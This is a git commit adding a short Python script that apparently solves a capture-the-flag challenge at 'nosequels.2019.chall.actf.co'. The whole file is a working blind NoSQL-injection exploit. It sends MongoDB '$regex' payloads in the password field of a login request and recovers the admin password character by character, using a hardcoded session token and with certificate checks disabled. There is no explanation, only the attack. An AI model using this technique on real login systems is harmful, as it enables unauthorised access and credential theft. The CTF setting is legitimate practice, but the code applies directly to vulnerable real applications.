d65b29f5e2ddbeb42259030e6235f6c067d89ddd
linuxjustin <30632275+linuxjustin@users.noreply.github.com>
2019-04-25 10:48:19 +0530

    Add files via upload

---
+++ monosqlbruteforcingpassword.py
@@ -0,0 +1,31 @@
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+url = "https://nosequels.2019.chall.actf.co/login"
+
+cookies = {
+"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1NzI4MjkyfQ.DRgByuPZJc-Ayvmdec5ot2CbjbCe6Bf7ucvI93gc1Wc"
+}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            print("Testing %s" % password+c)
+            payload={
+                "username": "admin", 
+                "password": {
+                    "$regex": "^"+password+c 
+                    }
+                }
+
+            r = requests.post(url, json = payload, verify = False, cookies=cookies)
+            print(r.text)
+            if "bad" in r.text:
+                print("Found one more char : %s" % (password+c))
+                password += c
+                break
